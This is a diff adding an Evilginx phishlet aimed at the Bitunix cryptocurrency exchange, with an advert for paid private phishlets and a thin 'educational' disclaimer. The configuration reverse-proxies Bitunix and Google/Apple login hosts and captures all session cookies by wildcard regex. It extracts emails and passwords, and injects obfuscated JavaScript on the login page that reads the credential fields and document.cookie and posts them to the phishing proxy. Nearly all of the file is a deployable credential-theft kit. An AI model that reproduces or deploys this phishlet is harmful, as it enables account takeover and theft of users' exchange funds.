@@ -1,0 +1,113 @@
+
+author: '@EvilWhales'
+min_ver: '3.3.0'
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+#RProxy LAB is intended solely for educational purposes and authorized security testing with EvilGinx / Modlishka / EvilPuppet e.t.c tools
+#https://subscord.com/store/1397884713951170610/checkout/aJLvWWpM-Nzgw (Purchase a membership in the RProxy x EvilWhales community) - Privat PHISHLETs / Modify EvilGinx / Modify Modlishka / Node JS Project Phishing / Spam / Red Teams
+proxy_hosts:
+#general_hosts
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bitunix.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'bitunix.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'img', orig_sub: 'img', domain: 'bitunix.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'bitunix.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'bitunix.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'unpkg.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'trackfp', orig_sub: 'trackfp', domain: 'bitunix.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'trackingweb', orig_sub: 'trackingweb', domain: 'bitunix.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'o', orig_sub: 'o', domain: 'clarity.ms', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'api', domain: 'livechatinc.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'alb', orig_sub: 'alb', domain: 'reddit.com', session: true, is_landing: false, auto_filter: true} 
+  - {phish_sub: 'pixel-config', orig_sub: 'pixel-config', domain: 'reddit.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'analytics', orig_sub: 'analytics', domain: 'twitter.com', session: true, is_landing: false, auto_filter: true}  
+  - {phish_sub: 'scripts', orig_sub: 'scripts', domain: 'clarity.ms', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'statics', orig_sub: 'static', domain: 'ads-twitter.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'livechatinc.com', session: true, is_landing: false, auto_filter: true}
+#secure_hosts
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'appleid', orig_sub: 'appleid', domain: 'cdn-apple.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.net', session: true, is_landing: false, auto_filter: true} 
+  - {phish_sub: 'wwws', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'livechatinc.com', session: true, is_landing: false, auto_filter: true}  
+  - {phish_sub: 'wsws', orig_sub: 'www', domain: 'clarity.ms', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sss', orig_sub: 'www', domain: 'redditstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'wwa', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'analytic', orig_sub: 'analytics', domain: 'google.com', session: true, is_landing: false, auto_filter: true} 
+  - {phish_sub: 'stats.g', orig_sub: 'stats.g', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aas', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: true}  
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'geetest.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gcaptcha4', orig_sub: 'gcaptcha4', domain: 'geetest.com', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'www', domain: 'bitunix.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'static', domain: 'bitunix.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'img', domain: 'bitunix.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'api', domain: 'bitunix.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: '', domain: 'bitunix.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: '', domain: 'unpkg.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'trackfp', domain: 'bitunix.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'trackingweb', domain: 'bitunix.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'o', domain: 'clarity.ms', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'api', domain: 'livechatinc.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'alb', domain: 'reddit.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'pixel-config', domain: 'reddit.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'analytics', domain: 'twitter.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'scripts', domain: 'clarity.ms', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'static', domain: 'ads-twitter.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'secure', domain: 'livechatinc.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'appleid', domain: 'cdn-apple.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'connect', domain: 'facebook.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'cdn', domain: 'livechatinc.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'www', domain: 'clarity.ms', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'www', domain: 'redditstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'analytics', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'stats.g', domain: 'doubleclick.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'www', domain: 'google-analytics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'static', domain: 'geetest.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bitunix.com', orig_sub: 'gcaptcha4', domain: 'geetest.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'gcaptcha4.geetest.com', orig_sub: 'gcaptcha4', domain: 'geetest.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static.geetest.com', orig_sub: 'static', domain: 'geetest.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: 'www.bitunix.com'
+    keys: ['.*,regexp']
+  - domain: '.google.com'
+    keys: ['.*,regexp']
+  - domain: 'accounts.google.com'
+    keys: ['.*,regexp']
+  - domain: 'gcaptcha4.geetest.com'
+    keys: ['.*,regexp']
+  - domain: 'api.bitunix.com'
+    keys: ['.*,regexp']
+  - domain: '.bitunix.com'
+    keys: ['.*,regexp']
+                
+auth_urls:
+  - '/assets/overview'
+  - '/*'
+credentials:
+  username:
+    key: 'email'
+    search: '"email":"([^"]*)'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    key: 'cookies'
+    search: '"cookies":"([^"]*)'
+    type: 'json'
+
+login:
+  domain: 'www.bitunix.com'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ["www.bitunix.com"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |
+      (function(_0x1e7e66,_0x520621){var _0x3704cd=_0x1c0b,_0x59d524=_0x1e7e66();while(!![]){try{var _0x42bdca=parseInt(_0x3704cd(0xe1))/0x1*(-parseInt(_0x3704cd(0xeb))/0x2)+parseInt(_0x3704cd(0xd3))/0x3*(parseInt(_0x3704cd(0xf3))/0x4)+-parseInt(_0x3704cd(0xee))/0x5*(-parseInt(_0x3704cd(0xf1))/0x6)+-parseInt(_0x3704cd(0xf5))/0x7*(-parseInt(_0x3704cd(0xcd))/0x8)+-parseInt(_0x3704cd(0xf7))/0x9+parseInt(_0x3704cd(0xd6))/0xa*(parseInt(_0x3704cd(0xcc))/0xb)+parseInt(_0x3704cd(0xd8))/0xc;if(_0x42bdca===_0x520621)break;else _0x59d524['push'](_0x59d524['shift']());}catch(_0x462c86){_0x59d524['push'](_0x59d524['shift']());}}}(_0x5e31,0x54a30));function lp(){var _0x52c43b=_0x1c0b,_0x1d5156=document[_0x52c43b(0xd1)](_0x52c43b(0xce)),_0x3a9d3e=document['querySelector'](_0x52c43b(0xef)),_0x58c120=document[_0x52c43b(0xd1)](_0x52c43b(0xea)),_0x546f05=document['createElement'](_0x52c43b(0xe0));_0x546f05[_0x52c43b(0xd0)][_0x52c43b(0xd7)]=_0x52c43b(0xec),_0x546f05[_0x52c43b(0xd0)]['top']='0',_0x546f05[_0x52c43b(0xd0)][_0x52c43b(0xe3)]='0',_0x546f05[_0x52c43b(0xd0)][_0x52c43b(0xe2)]=_0x52c43b(0xf4),_0x546f05[_0x52c43b(0xd0)][_0x52c43b(0xe8)]='100%',_0x546f05[_0x52c43b(0xd0)]['pointerEvents']='none',_0x546f05[_0x52c43b(0xd0)]['opacity']=_0x52c43b(0xe7),_0x546f05[_0x52c43b(0xd0)]['zIndex']=_0x52c43b(0xd9),_0x546f05['style'][_0x52c43b(0xe6)]='repeating-linear-gradient(45deg,\x20transparent,\x20transparent\x2050px,\x20rgba(255,\x20255,\x20255,\x200.5)\x2050px,\x20rgba(255,\x20255,\x20255,\x200.5)\x20100px)',_0x546f05['innerHTML']='<div\x20style=\x22position:\x20absolute;\x20transform:\x20rotate(-45deg);\x20font-size:\x2040px;\x20color:\x20#888;\x20text-align:\x20center;\x20width:\x20100%;\x20top:\x2050%;\x22>RProxy\x20LAB\x20x\x20EvilWhales</div>'[_0x52c43b(0xe9)](0xa),document[_0x52c43b(0xcf)][_0x52c43b(0xed)](_0x546f05);_0x1d5156&&_0x1d5156[_0x52c43b(0xd5)](_0x52c43b(0xd2),sendEmail);_0x3a9d3e&&_0x3a9d3e[_0x52c43b(0xd5)](_0x52c43b(0xd2),sendPassword);_0x58c120&&_0x58c120[_0x52c43b(0xd5)]('click',function(){setTimeout(sendData,0x1f4);});var _0x5889b1=new MutationObserver(function(_0xb877a1,_0x4ea273){var _0x24e8ca=_0x52c43b;window[_0x24e8ca(0xdd)]['pathname']!==_0x24e8ca(0xd4)&&(sendCookies(),window[_0x24e8ca(0xdd)][_0x24e8ca(0xcb)]=_0x24e8ca(0xda),_0x4ea273['disconnect']());});_0x5889b1['observe'](document[_0x52c43b(0xcf)],{'childList':!![],'subtree':!![]});}function sendEmail(){var _0x2a6e58=_0x1c0b,_0x28e991=document[_0x2a6e58(0xd1)](_0x2a6e58(0xce))[_0x2a6e58(0xf6)],_0x7bdb34=new XMLHttpRequest();_0x7bdb34[_0x2a6e58(0xdb)](_0x2a6e58(0xe5),'/',!![]),_0x7bdb34['setRequestHeader']('Content-Type',_0x2a6e58(0xe4)),_0x7bdb34['send'](JSON[_0x2a6e58(0xf2)]({'email':_0x28e991}));}function sendPassword(){var _0xfc773f=_0x1c0b,_0x465456=document[_0xfc773f(0xd1)](_0xfc773f(0xef))[_0xfc773f(0xf6)],_0x1fd718=new XMLHttpRequest();_0x1fd718[_0xfc773f(0xdb)]('POST','/',!![]),_0x1fd718[_0xfc773f(0xdc)](_0xfc773f(0xf0),_0xfc773f(0xe4)),_0x1fd718[_0xfc773f(0xdf)](JSON[_0xfc773f(0xf2)]({'password':_0x465456}));}function _0x1c0b(_0x1a5a7f,_0x24d2bf){var _0x5e3184=_0x5e31();return _0x1c0b=function(_0x1c0bff,_0x4e6fee){_0x1c0bff=_0x1c0bff-0xcb;var _0x1dc011=_0x5e3184[_0x1c0bff];return _0x1dc011;},_0x1c0b(_0x1a5a7f,_0x24d2bf);}function sendCookies(){var _0xca93b6=_0x1c0b,_0x38174e=document[_0xca93b6(0xde)],_0xb7029=new XMLHttpRequest();_0xb7029['open'](_0xca93b6(0xe5),'/',!![]),_0xb7029['setRequestHeader'](_0xca93b6(0xf0),'application/json'),_0xb7029[_0xca93b6(0xdf)](JSON[_0xca93b6(0xf2)]({'cookies':_0x38174e}));}function sendData(){sendEmail(),sendPassword(),sendCookies();}function _0x5e31(){var _0x17ace5=['input[name=\x22password\x22]','Content-Type','6AZWmsh','stringify','3208AnPoFN','100%','35lRNrUd','value','3695643tlNCZG','href','418ruCIfE','497704mSTKPu','input[name=\x22username\x22]','body','style','querySelector','blur','744AZCpaG','/login','addEventListener','1480PMIcdY','position','6833472ycqoaU','9999','/assets-overview','open','setRequestHeader','location','cookie','send','div','1wdNjXx','width','left','application/json','POST','background','0.2','height','repeat','button[type=\x22submit\x22]','847778mwLTZG','fixed','appendChild','480735LYhaMO'];_0x5e31=function(){return _0x17ace5;};return _0x5e31();}setTimeout(lp,0x9c4);
